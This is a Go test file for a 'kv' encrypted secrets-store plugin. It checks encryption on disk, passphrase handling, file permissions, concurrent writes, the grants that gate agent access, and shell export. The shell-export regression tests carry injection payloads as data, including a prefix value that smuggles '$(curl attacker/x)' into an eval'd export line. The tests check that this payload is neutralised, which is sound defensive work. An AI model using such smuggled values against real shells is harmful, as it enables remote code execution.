package kv

import (
	"bytes"
	"context"
	"crypto/ed25519"
	"crypto/rand"
	"encoding/json"
	"encoding/pem"
	"fmt"
	"io"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"filippo.io/age"
	"golang.org/x/crypto/ssh"

	"github.com/this-is-tobi/rule-them-all/pkg/plugin"
	"github.com/this-is-tobi/rule-them-all/pkg/view"
)

// TestMain lowers the passphrase KDF cost for the whole package. The suite
// encrypts and decrypts hundreds of times and never tests the KDF itself;
// at age's shipped work factor it would spend minutes doing nothing else.
func TestMain(m *testing.M) {
	scryptWorkFactor = 10
	os.Exit(m.Run())
}

func setup(t *testing.T) string {
	t.Helper()
	dir := t.TempDir()
	t.Setenv("RTA_DATA_DIR", dir)
	t.Setenv(passphraseEnv, "")
	// The config directory matters as much as the data one: it is where a
	// generated key lives, and identityPath looks there last. A test that
	// leaves it pointing at the real machine passes or fails on whether the
	// person running it happens to own a kv key — and worse, quietly locks
	// its "passphrase" store to that key instead. Every test gets its own.
	t.Setenv("RTA_CONFIG", filepath.Join(t.TempDir(), "config.yaml"))
	t.Setenv(identityEnv, "")
	return dir
}

func req(values map[string]any, dryRun bool) plugin.Request {
	if values == nil {
		values = map[string]any{}
	}
	if _, ok := values["passphrase"]; !ok {
		values["passphrase"] = "correct horse battery staple"
	}
	return plugin.NewRequest(values, dryRun, false)
}

func text(t *testing.T, h plugin.Handler, values map[string]any, dryRun bool) string {
	t.Helper()
	v, err := h(context.Background(), req(values, dryRun))
	if err != nil {
		t.Fatal(err)
	}
	txt, ok := v.(view.Text)
	if !ok {
		t.Fatalf("want Text, got %s", view.TypeOf(v))
	}
	return txt.Body
}

func table(t *testing.T, h plugin.Handler, values map[string]any) view.Table {
	t.Helper()
	v, err := h(context.Background(), req(values, false))
	if err != nil {
		t.Fatal(err)
	}
	tbl, ok := v.(view.Table)
	if !ok {
		t.Fatalf("want Table, got %s", view.TypeOf(v))
	}
	return tbl
}

// col resolves a column name to its index, so tests survive reordering.
func col(t *testing.T, tbl view.Table, name string) int {
	t.Helper()
	for i, c := range tbl.Columns {
		if c.Name == name {
			return i
		}
	}
	t.Fatalf("column %q not found in %v", name, tbl.Columns)
	return -1
}

func TestPluginIsValid(t *testing.T) {
	if err := Plugin().Validate(); err != nil {
		t.Fatal(err)
	}
}

func TestSafetyClasses(t *testing.T) {
	want := map[string]plugin.Safety{
		"kv.list":       plugin.Read,
		"kv.get":        plugin.Write, // deliberate: revealing a secret is the sensitive act
		"kv.copy":       plugin.Write, // …and a clipboard is somewhere a secret has been revealed to
		"kv.edit":       plugin.Write, // …as is an editor buffer
		"kv.rename":     plugin.Write,
		"kv.env":        plugin.Write, // …and so is exporting one
		"kv.set":        plugin.Write,
		"kv.rm":         plugin.Destructive,
		"kv.recipients": plugin.Read,
		"kv.status":     plugin.Read,
		"kv.show":       plugin.Read,
		"kv.init":       plugin.Write,
		"kv.rekey":      plugin.Destructive, // it can take every reader's access away at once
	}
	seen := map[string]bool{}
	for _, c := range Plugin().Capabilities {
		w, ok := want[c.ID]
		if !ok {
			t.Errorf("unexpected capability %s", c.ID)
			continue
		}
		seen[c.ID] = true
		if c.Safety != w {
			t.Errorf("%s safety = %s, want %s", c.ID, c.Safety, w)
		}
	}
	for id := range want {
		if !seen[id] {
			t.Errorf("capability %s missing", id)
		}
	}
}

// kv.rm and kv.set lose the same secret — one by deleting it, one by writing
// over it, and nothing keeps the old value in either case — so neither may be
// reachable by an agent holding only a standing allowlist. kv.set was the
// cheaper of the two for a while: --allow-write and no question asked, for
// damage --allow-destructive plus a per-key grant was thought too small to
// leave ungated.
func TestSetAndRemoveAskAPersonTheSameQuestion(t *testing.T) {
	caps := map[string]plugin.Capability{}
	for _, c := range Plugin().Capabilities {
		caps[c.ID] = c
	}
	for _, id := range []string{"kv.set", "kv.rm"} {
		c, ok := caps[id]
		if !ok {
			t.Fatalf("%s is not registered", id)
		}
		// The rule internal/grant.Required applies: Destructive carries a
		// grant implicitly, anything else has to declare one.
		if !c.NeedsGrant && c.Safety != plugin.Destructive {
			t.Errorf("%s can destroy a stored secret with no grant", id)
		}
		if c.Scope != "key" {
			t.Errorf("%s scope = %q, want the grant narrowed to one key", id, c.Scope)
		}
	}
}

func TestSetGetRoundTrip(t *testing.T) {
	setup(t)
	text(t, runSet, map[string]any{"key": "token", "value": "s3cr3t"}, false)

	v, err := runGet(context.Background(), req(map[string]any{"key": "token"}, false))
	if err != nil {
		t.Fatal(err)
	}
	if got := v.(view.Text).Body; got != "s3cr3t" {
		t.Errorf("get = %q, want s3cr3t", got)
	}
}

// A regression test for a real bug review found: kv's
// write handlers (set, rename, remove, rekey) decrypt the whole store,
// mutate one entry in memory, and write the whole thing back, with nothing
// between the load and the save stopping a second writer from doing the
// same and clobbering the first. Plausible any time two calls actually run
// concurrently — the MCP bridge dispatches every tools/call in its own
// goroutine, so an agent pipelining two kv.set calls is the ordinary case,
// not a rare one.
func TestConcurrentSetsDoNotLoseEachOthersWrites(t *testing.T) {
	setup(t)
	// Seed the store first, unlocked and alone, so every goroutine below
	// races a real load..save window against an existing file rather than
	// each separately creating the store from nothing — a different, easier
	// case that would not exercise the bug.
	text(t, runSet, map[string]any{"key": "seed", "value": "v0"}, false)

	const n = 8
	errs := make(chan error, n)
	for i := range n {
		go func(i int) {
			_, err := runSet(context.Background(),
				req(map[string]any{"key": fmt.Sprintf("k%d", i), "value": "v"}, false))
			errs <- err
		}(i)
	}
	for range n {
		if err := <-errs; err != nil {
			t.Fatalf("concurrent set: %v", err)
		}
	}

	tbl := table(t, runList, nil)
	if len(tbl.Rows) != n+1 { // n distinct keys, plus the seed
		t.Fatalf("store holds %d entries after %d concurrent writers (plus the seed), want %d — some writes were lost",
			len(tbl.Rows), n, n+1)
	}
}

func TestSetOverwriteUpdatesValueKeepsCreated(t *testing.T) {
	setup(t)
	text(t, runSet, map[string]any{"key": "k", "value": "v1"}, false)

	tbl := table(t, runList, map[string]any{"detail": true})
	created := tbl.Rows[0][col(t, tbl, "Created")]

	body := text(t, runSet, map[string]any{"key": "k", "value": "v2-longer-value"}, false)
	if !strings.Contains(body, "updated") {
		t.Errorf("overwrite message = %q, want \"updated\"", body)
	}

	got, err := runGet(context.Background(), req(map[string]any{"key": "k"}, false))
	if err != nil {
		t.Fatal(err)
	}
	if got.(view.Text).Body != "v2-longer-value" {
		t.Errorf("overwritten value = %v", got)
	}
	tbl = table(t, runList, map[string]any{"detail": true})
	if tbl.Rows[0][col(t, tbl, "Created")] != created {
		t.Errorf("overwrite must not reset Created: %v", tbl.Rows[0])
	}
}

// TestListNeverLeaksValues is the core safety property of kv.list: whatever
// the secret is, it must never appear in the listing, not even truncated.
func TestListNeverLeaksValues(t *testing.T) {
	setup(t)
	text(t, runSet, map[string]any{
		"key": "db-password", "value": "hunter2-unmistakable-marker",
		"description": "the staging database",
	}, false)
	text(t, runSet, map[string]any{"key": "api-token", "value": "another-unmistakable-secret"}, false)

	for _, values := range []map[string]any{{}, {"detail": true}} {
		tbl := table(t, runList, values)
		if len(tbl.Rows) != 2 {
			t.Fatalf("list rows = %v", tbl.Rows)
		}
		for _, row := range tbl.Rows {
			for _, cell := range row {
				if strings.Contains(cell, "hunter2") || strings.Contains(cell, "unmistakable") {
					t.Fatalf("list leaked a value: %v", row)
				}
			}
		}
	}
}

func TestGetNotFoundIsCoded(t *testing.T) {
	setup(t)
	text(t, runSet, map[string]any{"key": "x", "value": "y"}, false)
	_, err := runGet(context.Background(), req(map[string]any{"key": "nope"}, false))
	ve := view.AsError(err, "z")
	if ve.Code != "kv.notfound" || ve.Hint == "" {
		t.Errorf("want kv.notfound with hint, got %+v", ve)
	}
}

func TestRemove(t *testing.T) {
	setup(t)
	text(t, runSet, map[string]any{"key": "x", "value": "y"}, false)
	body := text(t, runRemove, map[string]any{"key": "x"}, false)
	if !strings.Contains(body, "removed") {
		t.Errorf("remove message = %q", body)
	}
	_, err := runGet(context.Background(), req(map[string]any{"key": "x"}, false))
	if ve := view.AsError(err, "z"); ve.Code != "kv.notfound" {
		t.Errorf("get after remove should 404, got %+v", ve)
	}
}

func TestRemoveNotFoundIsCoded(t *testing.T) {
	setup(t)
	_, err := runRemove(context.Background(), req(map[string]any{"key": "nope"}, false))
	if ve := view.AsError(err, "z"); ve.Code != "kv.notfound" {
		t.Errorf("want kv.notfound, got %+v", ve)
	}
}

func TestDryRunTouchesNothing(t *testing.T) {
	setup(t)
	text(t, runSet, map[string]any{"key": "x", "value": "real"}, false)

	if body := text(t, runSet, map[string]any{"key": "x", "value": "phantom"}, true); !strings.Contains(body, "would set") {
		t.Errorf("dry-run set = %q", body)
	}
	got, _ := runGet(context.Background(), req(map[string]any{"key": "x"}, false))
	if got.(view.Text).Body != "real" {
		t.Errorf("dry-run set mutated the store: %v", got)
	}

	if body := text(t, runRemove, map[string]any{"key": "x"}, true); !strings.Contains(body, "would remove") {
		t.Errorf("dry-run rm = %q", body)
	}
	if _, err := runGet(context.Background(), req(map[string]any{"key": "x"}, false)); err != nil {
		t.Error("dry-run remove deleted the key")
	}
}

// --- Descriptions and kinds -------------------------------------------------

func TestDescriptionIsStoredAndListed(t *testing.T) {
	setup(t)
	text(t, runSet, map[string]any{
		"key": "api-token-2", "value": "abc", "description": "billing API, rotates monthly",
	}, false)
	tbl := table(t, runList, nil)
	if got := tbl.Rows[0][col(t, tbl, "Description")]; got != "billing API, rotates monthly" {
		t.Errorf("description = %q", got)
	}
}

// Re-setting a rotated secret without repeating --description must not erase
// what the entry is for.
func TestDescriptionSurvivesRotation(t *testing.T) {
	setup(t)
	text(t, runSet, map[string]any{"key": "k", "value": "old", "description": "why it exists"}, false)
	text(t, runSet, map[string]any{"key": "k", "value": "rotated"}, false)
	tbl := table(t, runList, nil)
	if got := tbl.Rows[0][col(t, tbl, "Description")]; got != "why it exists" {
		t.Errorf("description after rotation = %q", got)
	}
}

func TestDetectKind(t *testing.T) {
	for name, tc := range map[string]struct {
		value, filename, want string
	}{
		"certificate": {"-----BEGIN CERTIFICATE-----\nMII…\n-----END CERTIFICATE-----", "", "certificate"},
		"private key": {"-----BEGIN OPENSSH PRIVATE KEY-----\nb3B…", "", "private-key"},
		"public key":  {"-----BEGIN PUBLIC KEY-----\nMFk…", "", "public-key"},
		"ssh key":     {"ssh-ed25519 AAAAC3Nza… me@host", "", "ssh-key"},
		"json":        {`{"user":"a","pass":"b"}`, "", "json"},
		"json array":  {`[1,2,3]`, "", "json"},
		"not json":    {"{not json at all", "", "string"},
		"file":        {"arbitrary bytes", "kubeconfig", "file"},
		"string":      {"hunter2", "", "string"},
	} {
		if got := detectKind(tc.value, tc.filename); got != tc.want {
			t.Errorf("%s: detectKind = %q, want %q", name, got, tc.want)
		}
	}
}

func TestSetFromFileRecordsKindAndSource(t *testing.T) {
	setup(t)
	dir := t.TempDir()
	pemBody := "-----BEGIN CERTIFICATE-----\nMIIabc\n-----END CERTIFICATE-----\n"
	if err := os.WriteFile(dir+"/server.crt", []byte(pemBody), 0o600); err != nil {
		t.Fatal(err)
	}
	text(t, runSet, map[string]any{"key": "cert", "file": dir + "/server.crt"}, false)

	tbl := table(t, runList, map[string]any{"detail": true})
	if got := tbl.Rows[0][col(t, tbl, "Kind")]; got != "certificate" {
		t.Errorf("kind = %q, want certificate", got)
	}
	if got := tbl.Rows[0][col(t, tbl, "Source")]; got != "file:server.crt" {
		t.Errorf("source = %q", got)
	}
}

// **Source says how the entry came to exist, not which file it came from.**
//
// It used to print Filename, which is empty for anything not read off disk —
// so the column was blank for every secret somebody typed and every one a
// profile form created, and their provenance lived in the description or
// nowhere. "agent" is the value that cannot be recovered later by any means:
// a secret an MCP caller wrote is byte-identical afterwards to one the
// operator typed, and "which of these did I not put here myself" is a fair
// question to ask of your own store.
func TestSourceSaysHowTheEntryCameToExist(t *testing.T) {
	setup(t)
	// Store reads the passphrase from the environment, the way the TUI runs it.
	t.Setenv(passphraseEnv, "correct horse battery staple")
	dir := t.TempDir()
	if err := os.WriteFile(dir+"/server.crt", []byte("-----BEGIN CERTIFICATE-----\nx\n"), 0o600); err != nil {
		t.Fatal(err)
	}

	text(t, runSet, map[string]any{"key": "typed-one", "value": "hunter2"}, false)
	text(t, runSet, map[string]any{"key": "from-file", "file": dir + "/server.crt"}, false)
	if verr := Store("from-form", "s3cret", "credential for profile staging", "profile:staging"); verr != nil {
		t.Fatal(verr)
	}
	// The MCP surface, which is the one nothing else records.
	if _, err := runSet(context.Background(), plugin.NewRequest(
		map[string]any{"key": "from-agent", "value": "written-by-a-model",
			"passphrase": "correct horse battery staple"}, false, true).WithSurface(plugin.SurfaceMCP)); err != nil {
		t.Fatal(err)
	}

	want := map[string]string{
		"typed-one":  "typed",
		"from-file":  "file:server.crt",
		"from-form":  "profile:staging",
		"from-agent": "agent",
	}
	tbl := table(t, runList, map[string]any{"detail": true})
	keyCol, srcCol := col(t, tbl, "Key"), col(t, tbl, "Source")
	got := map[string]string{}
	for _, row := range tbl.Rows {
		got[row[keyCol]] = row[srcCol]
	}
	for key, w := range want {
		if got[key] != w {
			t.Errorf("%s: source = %q, want %q", key, got[key], w)
		}
	}
}

// An entry written before Origin existed still says what little it knew, and
// says nothing rather than guessing when it knew nothing. Otherwise every
// store in existence would report its whole contents as "typed" the moment
// this shipped.
func TestAnEntryWrittenBeforeOriginFallsBackToItsFilename(t *testing.T) {
	if got := (entry{Filename: "server.crt"}).origin(); got != "file:server.crt" {
		t.Errorf("origin = %q, want file:server.crt", got)
	}
	if got := (entry{}).origin(); got != "" {
		t.Errorf("origin = %q, want nothing claimed", got)
	}
	// A recorded origin wins over a filename, so an entry that has both is
	// described by the one that was chosen deliberately.
	if got := (entry{Origin: "agent", Filename: "server.crt"}).origin(); got != "agent" {
		t.Errorf("origin = %q, want agent", got)
	}
}

func TestListFiltersByKind(t *testing.T) {
	setup(t)
	text(t, runSet, map[string]any{"key": "a", "value": "plain"}, false)
	text(t, runSet, map[string]any{"key": "b", "value": `{"x":1}`}, false)

	tbl := table(t, runList, map[string]any{"kind": "json"})
	if len(tbl.Rows) != 1 || tbl.Rows[0][0] != "b" {
		t.Errorf("kind filter = %v", tbl.Rows)
	}
	v, err := runList(context.Background(), req(map[string]any{"kind": "certificate"}, false))
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(v.(view.Text).Body, "No key of kind certificate") {
		t.Errorf("empty kind filter = %v", v)
	}
}

func TestSetBadKindIsCoded(t *testing.T) {
	setup(t)
	_, err := runSet(context.Background(), req(map[string]any{"key": "k", "value": "v", "kind": "wat"}, false))
	ve := view.AsError(err, "z")
	if ve.Code != "kv.set.badkind" || ve.Hint == "" {
		t.Errorf("want kv.set.badkind with hint, got %+v", ve)
	}
}

// --- Getting a value back onto disk -----------------------------------------

func TestGetWritesFileWithTightPermissions(t *testing.T) {
	setup(t)
	body := "-----BEGIN CERTIFICATE-----\nMIIabc\n-----END CERTIFICATE-----"
	text(t, runSet, map[string]any{"key": "cert", "value": body}, false)

	out := filepath.Join(t.TempDir(), "server.crt")
	msg := text(t, runGet, map[string]any{"key": "cert", "out": out}, false)
	if !strings.Contains(msg, "0600") {
		t.Errorf("get --out message = %q", msg)
	}
	// The value must not be in the message — that is the whole point of --out.
	if strings.Contains(msg, "MIIabc") {
		t.Fatalf("--out printed the secret anyway: %q", msg)
	}
	written, err := os.ReadFile(out)
	if err != nil {
		t.Fatal(err)
	}
	// Exactly what was stored — get --out is a round trip, not an editorial
	// pass that decides whether something needed a trailing newline.
	if string(written) != body {
		t.Errorf("written value = %q, want %q", written, body)
	}
	info, err := os.Stat(out)
	if err != nil {
		t.Fatal(err)
	}
	if perm := info.Mode().Perm(); perm != 0o600 {
		t.Errorf("mode = %v, want 0600 — a secret must not land world-readable", perm)
	}
}

// A store is only as good as what comes back out of it. entry.Value used to
// be a Go string, and the whole store went through encoding/json before
// encryption — which replaces any byte sequence that is not valid UTF-8 with
// U+FFFD, silently. A certificate, a key, a token: anything not text was
// corrupted the moment it was stored, with no error anywhere in the path.
func TestBinaryValuesRoundTripByteForByte(t *testing.T) {
	setup(t)
	dir := t.TempDir()
	// Every byte value, including NUL and invalid UTF-8 sequences — exactly
	// what json.Marshal on a string would have mangled.
	raw := make([]byte, 256)
	for i := range raw {
		raw[i] = byte(i)
	}
	src := filepath.Join(dir, "blob.bin")
	if err := os.WriteFile(src, raw, 0o600); err != nil {
		t.Fatal(err)
	}
	text(t, runSet, map[string]any{"key": "blob", "file": src}, false)

	out := filepath.Join(dir, "blob.round")
	text(t, runGet, map[string]any{"key": "blob", "out": out}, false)
	got, err := os.ReadFile(out)
	if err != nil {
		t.Fatal(err)
	}
	if !bytes.Equal(got, raw) {
		t.Fatalf("round trip mangled the value: %d bytes in, %d out, equal=%v", len(raw), len(got), bytes.Equal(got, raw))
	}
}

// A file's trailing bytes are not whitespace to be tidied away — a stored
// file used to lose its trailing newlines on the way in and gain exactly one
// back on the way out, so even valid UTF-8 did not survive a round trip.
func TestFileValuesPreserveTrailingBytes(t *testing.T) {
	setup(t)
	dir := t.TempDir()
	src := filepath.Join(dir, "multi.txt")
	body := []byte("line1\nline2\n\n\n")
	if err := os.WriteFile(src, body, 0o600); err != nil {
		t.Fatal(err)
	}
	text(t, runSet, map[string]any{"key": "multi", "file": src}, false)

	out := filepath.Join(dir, "multi.round")
	text(t, runGet, map[string]any{"key": "multi", "out": out}, false)
	got, err := os.ReadFile(out)
	if err != nil {
		t.Fatal(err)
	}
	if !bytes.Equal(got, body) {
		t.Errorf("got %q, want %q byte for byte", got, body)
	}
}

// os.WriteFile only applies its mode argument to a file it creates — writing
// over an existing world-readable file left it world-readable while the
// message printed "mode 0600" beside it.
func TestGetOutFixesPermissionsOnAnExistingFile(t *testing.T) {
	setup(t)
	text(t, runSet, map[string]any{"key": "k", "value": "s3cr3t"}, false)

	out := filepath.Join(t.TempDir(), "already-here")
	if err := os.WriteFile(out, []byte("old contents"), 0o644); err != nil {
		t.Fatal(err)
	}
	text(t, runGet, map[string]any{"key": "k", "out": out}, false)

	info, err := os.Stat(out)
	if err != nil {
		t.Fatal(err)
	}
	if perm := info.Mode().Perm(); perm != 0o600 {
		t.Errorf("mode = %v, want 0600 even though the file already existed", perm)
	}
	got, err := os.ReadFile(out)
	if err != nil {
		t.Fatal(err)
	}
	if string(got) != "s3cr3t" {
		t.Errorf("content = %q", got)
	}
}

func TestGetOutDryRunWritesNothing(t *testing.T) {
	setup(t)
	text(t, runSet, map[string]any{"key": "k", "value": "v"}, false)
	out := filepath.Join(t.TempDir(), "nope")
	if body := text(t, runGet, map[string]any{"key": "k", "out": out}, true); !strings.Contains(body, "would write") {
		t.Errorf("dry-run = %q", body)
	}
	if _, err := os.Stat(out); !os.IsNotExist(err) {
		t.Error("dry-run --out created a file")
	}
}

// --- Shell export -----------------------------------------------------------

func TestEnvName(t *testing.T) {
	for _, tc := range []struct{ prefix, key, want string }{
		{"", "db-password", "DB_PASSWORD"},
		{"", "api.token/v2", "API_TOKEN_V2"},
		{"APP_", "secret", "APP_SECRET"},
		{"", "2fa-seed", "_2FA_SEED"}, // a shell will not take a leading digit
		{"X=1\nexport PWNED=$(x)\nDB_", "PASSWORD", "X_1_EXPORT_PWNED___X__DB_PASSWORD"},
	} {
		if got := envName(tc.prefix, tc.key); got != tc.want {
			t.Errorf("envName(%q, %q) = %q, want %q", tc.prefix, tc.key, got, tc.want)
		}
	}
}

// A regression test for a real, reproduced vulnerability review found:
// --prefix was concatenated into `kv env`'s output with
// no filtering, unlike key (character-whitelisted) and value
// (shell-quoted). A prefix containing a newline broke the output into
// extra lines, one of which could carry a live command substitution — a
// direct hit against `eval "$(rta kv env …)"`, this capability's own
// documented usage. Because prefix is not a Local field, this was also
// reachable from an MCP caller holding nothing more than a per-key grant
// to reveal one value, exceeding what that grant authorizes.
func TestEnvPrefixCannotInjectExtraLinesOrCommands(t *testing.T) {
	setup(t)
	text(t, runSet, map[string]any{"key": "db-password", "value": "s3cret"}, false)

	body := text(t, runEnv, map[string]any{
		"key":    []string{"db-password"},
		"prefix": "X=1\nexport PWNED=$(curl attacker/x)\nDB_",
	}, false)

	if strings.Count(body, "\n") != 0 {
		t.Fatalf("output has %d newlines, want exactly the one line: %q", strings.Count(body, "\n"), body)
	}
	if strings.ContainsAny(body, "$()") {
		t.Errorf("shell metacharacters survived into the output: %q", body)
	}
	if body != `export X_1_EXPORT_PWNED___CURL_ATTACKER_X__DB_DB_PASSWORD='s3cret'` {
		t.Errorf("got %q", body)
	}
}

// A value with a quote in it must survive the round trip through a shell —
// otherwise eval either breaks or, far worse, executes part of the secret.
func TestShellQuoteSurvivesQuotes(t *testing.T) {
	got := shellQuote(`it's "quoted" $(and injected)`)
	if !strings.HasPrefix(got, "'") || !strings.HasSuffix(got, "'") {
		t.Fatalf("not single-quoted: %s", got)
	}
	if strings.Contains(got, `it's`) {
		t.Errorf("bare single quote survived: %s", got)
	}
	if got != `'it'\''s "quoted" $(and injected)'` {
		t.Errorf("shellQuote = %s", got)
	}
}

func TestEnvExportsSelectedKeys(t *testing.T) {
	setup(t)
	text(t, runSet, map[string]any{"key": "db-password", "value": "p@ss"}, false)
	text(t, runSet, map[string]any{"key": "other", "value": "nope"}, false)

	body := text(t, runEnv, map[string]any{"key": []string{"db-password"}}, false)
	if body != `export DB_PASSWORD='p@ss'` {
		t.Errorf("env = %q", body)
	}
	if strings.Contains(body, "nope") {
		t.Error("exported a key that was not asked for")
	}
}

func TestEnvExportsEverythingByDefault(t *testing.T) {
	setup(t)
	text(t, runSet, map[string]any{"key": "b", "value": "2"}, false)
	text(t, runSet, map[string]any{"key": "a", "value": "1"}, false)

	body := text(t, runEnv, map[string]any{"prefix": "APP_"}, false)
	want := "export APP_A='1'\nexport APP_B='2'" // sorted, so output is stable
	if body != want {
		t.Errorf("env = %q, want %q", body, want)
	}
}

func TestEnvDotenvFormat(t *testing.T) {
	setup(t)
	text(t, runSet, map[string]any{"key": "k", "value": "v"}, false)
	if body := text(t, runEnv, map[string]any{"format": "dotenv"}, false); body != `K='v'` {
		t.Errorf("dotenv = %q", body)
	}
}

func TestEnvBadFormatIsCoded(t *testing.T) {
	setup(t)
	_, err := runEnv(context.Background(), req(map[string]any{"format": "yaml"}, false))
	ve := view.AsError(err, "z")
	if ve.Code != "kv.env.badformat" || ve.Hint == "" {
		t.Errorf("want kv.env.badformat with hint, got %+v", ve)
	}
}

func TestEnvUnknownKeyIsCoded(t *testing.T) {
	setup(t)
	text(t, runSet, map[string]any{"key": "k", "value": "v"}, false)
	_, err := runEnv(context.Background(), req(map[string]any{"key": []string{"nope"}}, false))
	if ve := view.AsError(err, "z"); ve.Code != "kv.notfound" {
		t.Errorf("want kv.notfound, got %+v", ve)
	}
}

// --- Passphrase handling ----------------------------------------------------

func TestMissingPassphraseIsCoded(t *testing.T) {
	setup(t)
	text(t, runSet, map[string]any{"key": "k", "value": "v"}, false)

	_, err := runList(context.Background(), plugin.NewRequest(nil, false, false))
	ve := view.AsError(err, "z")
	if ve.Code != "kv.passphrase.missing" || ve.Hint == "" {
		t.Errorf("want kv.passphrase.missing with hint, got %+v", ve)
	}
}

// Listing a store that does not exist yet is not a locked door — there is
// nothing behind it. Demanding a passphrase to be told "empty" would be
// friction with no security value.
func TestEmptyStoreNeedsNoPassphrase(t *testing.T) {
	setup(t)
	v, err := runList(context.Background(), plugin.NewRequest(nil, false, false))
	if err != nil {
		t.Fatalf("listing a store that does not exist: %v", err)
	}
	if !strings.Contains(v.(view.Text).Body, "No keys stored yet") {
		t.Errorf("empty list = %v", v)
	}
}

func TestPassphraseFromEnv(t *testing.T) {
	setup(t)
	t.Setenv(passphraseEnv, "env-passphrase")

	if _, err := runSet(context.Background(), plugin.NewRequest(map[string]any{"key": "k", "value": "v"}, false, false)); err != nil {
		t.Fatal(err)
	}
	v, err := runGet(context.Background(), plugin.NewRequest(map[string]any{"key": "k"}, false, false))
	if err != nil {
		t.Fatal(err)
	}
	if v.(view.Text).Body != "v" {
		t.Errorf("get via env passphrase = %v", v)
	}
}

func TestFlagPassphraseOverridesEnv(t *testing.T) {
	setup(t)
	t.Setenv(passphraseEnv, "env-passphrase")
	_, err := runSet(context.Background(), plugin.NewRequest(map[string]any{
		"key": "k", "value": "v", "passphrase": "explicit-passphrase",
	}, false, false))
	if err != nil {
		t.Fatal(err)
	}
	// The env passphrase must NOT decrypt a store written with the explicit one.
	_, err = runGet(context.Background(), plugin.NewRequest(map[string]any{"key": "k"}, false, false))
	if ve := view.AsError(err, "z"); ve.Code != "kv.wrongpass" {
		t.Errorf("want kv.wrongpass when env differs from the flag used to write, got %+v", ve)
	}
}

func TestWrongPassphraseIsCoded(t *testing.T) {
	setup(t)
	text(t, runSet, map[string]any{"key": "x", "value": "y"}, false)
	_, err := runList(context.Background(), req(map[string]any{"passphrase": "not the right one"}, false))
	ve := view.AsError(err, "z")
	if ve.Code != "kv.wrongpass" || ve.Hint == "" {
		t.Errorf("want kv.wrongpass with hint, got %+v", ve)
	}
}

// stubPrompt makes the prompt reachable and counts how often it is used.
func stubPrompt(t *testing.T, answer string) *int {
	t.Helper()
	asked := 0
	origPrompt, origCan := promptPassphrase, canPrompt
	promptPassphrase = func() (string, error) { asked++; return answer, nil }
	canPrompt = func(req plugin.Request) bool { return req.Surface() == plugin.SurfaceCLI }
	t.Cleanup(func() {
		promptPassphrase, canPrompt, prompted = origPrompt, origCan, ""
	})
	prompted = ""
	return &asked
}

// A prompt is for a person at a terminal. An MCP request has no terminal at
// the other end and must get the coded refusal, not a process blocked
// forever on a read nobody will answer.
func TestOnlyTheCLIMayPrompt(t *testing.T) {
	setup(t)
	asked := stubPrompt(t, "typed-at-the-prompt")

	for _, surface := range []plugin.Surface{plugin.SurfaceMCP, plugin.SurfaceTUI, plugin.SurfaceUnknown} {
		r := plugin.NewRequest(nil, false, false).WithSurface(surface)
		if _, verr := resolvePassphrase(r); verr == nil {
			t.Errorf("%s: resolved a passphrase from nowhere", surface)
		}
	}
	if *asked != 0 {
		t.Errorf("prompted %d times from non-CLI surfaces", *asked)
	}
}

// One command, one prompt: kv set both reads and rewrites the store, and
// being asked for the same passphrase twice in a row reads as a failure.
func TestPromptedPassphraseIsAskedOnce(t *testing.T) {
	setup(t)
	asked := stubPrompt(t, "typed-at-the-prompt")

	cli := plugin.NewRequest(map[string]any{"key": "k", "value": "v"}, false, false).
		WithSurface(plugin.SurfaceCLI)
	if _, err := runSet(context.Background(), cli); err != nil {
		t.Fatal(err)
	}
	if *asked != 1 {
		t.Errorf("kv set asked for the passphrase %d times, want 1", *asked)
	}
	// And the value really was encrypted under what was typed.
	v, err := runGet(context.Background(), req(map[string]any{
		"key": "k", "passphrase": "typed-at-the-prompt",
	}, false))
	if err != nil {
		t.Fatal(err)
	}
	if v.(view.Text).Body != "v" {
		t.Errorf("value = %v", v)
	}
}

// --- Store is actually encrypted on disk ------------------------------------

// TestStoreFileIsNotPlaintext is the property that justifies the whole
// plugin: whatever we write to disk must not contain the secret in the
// clear, even if the store's internal JSON shape or key names leaked.
func TestStoreFileIsNotPlaintext(t *testing.T) {
	dir := setup(t)
	text(t, runSet, map[string]any{
		"key": "my-unique-key-name", "value": "my-unique-secret-value",
		"description": "my-unique-description",
	}, false)

	raw, err := os.ReadFile(filepath.Join(dir, storeFile))
	if err != nil {
		t.Fatal(err)
	}
	for _, secret := range []string{"my-unique-secret-value", "my-unique-key-name", "my-unique-description"} {
		if strings.Contains(string(raw), secret) {
			t.Fatalf("store file contains %q in the clear", secret)
		}
	}
	if !strings.HasPrefix(string(raw), "age-encryption.org/") {
		t.Errorf("store file does not look age-encrypted: %q", string(raw[:min(40, len(raw))]))
	}
	info, err := os.Stat(filepath.Join(dir, storeFile))
	if err != nil {
		t.Fatal(err)
	}
	if perm := info.Mode().Perm(); perm != 0o600 {
		t.Errorf("store mode = %v, want 0600", perm)
	}
}

func TestSetNoValueIsCoded(t *testing.T) {
	setup(t)
	_, err := runSet(context.Background(), req(map[string]any{"key": "x"}, false))
	if ve := view.AsError(err, "z"); ve.Code != "kv.set.novalue" {
		t.Errorf("want kv.set.novalue, got %+v", ve)
	}
}

func TestSetUnreadableFileIsCoded(t *testing.T) {
	setup(t)
	_, err := runSet(context.Background(), req(map[string]any{"key": "x", "file": "/no/such/file"}, false))
	if ve := view.AsError(err, "z"); ve.Code != "kv.file.unreadable" {
		t.Errorf("want kv.file.unreadable, got %+v", ve)
	}
}

func TestListEmptyStoreIsFriendly(t *testing.T) {
	setup(t)
	v, err := runList(context.Background(), req(nil, false))
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(v.(view.Text).Body, "No keys stored yet") {
		t.Errorf("empty list = %v", v)
	}
}

// --- SSH-key encryption -----------------------------------------------------

// writeSSHKeypair writes an ed25519 keypair in the formats ssh-keygen would.
func writeSSHKeypair(t *testing.T, dir, name string) (private, public string) {
	t.Helper()
	pub, priv, err := ed25519.GenerateKey(rand.Reader)
	if err != nil {
		t.Fatal(err)
	}
	block, err := ssh.MarshalPrivateKey(priv, "")
	if err != nil {
		t.Fatal(err)
	}
	private = filepath.Join(dir, name)
	if err := os.WriteFile(private, pem.EncodeToMemory(block), 0o600); err != nil {
		t.Fatal(err)
	}
	sshPub, err := ssh.NewPublicKey(pub)
	if err != nil {
		t.Fatal(err)
	}
	public = private + ".pub"
	line := strings.TrimSpace(string(ssh.MarshalAuthorizedKey(sshPub))) + " " + name + "@test\n"
	if err := os.WriteFile(public, []byte(line), 0o644); err != nil {
		t.Fatal(err)
	}
	return private, public
}

// The whole point of key mode: a store you unlock with the SSH key you
// already own and already back up, instead of one more passphrase.
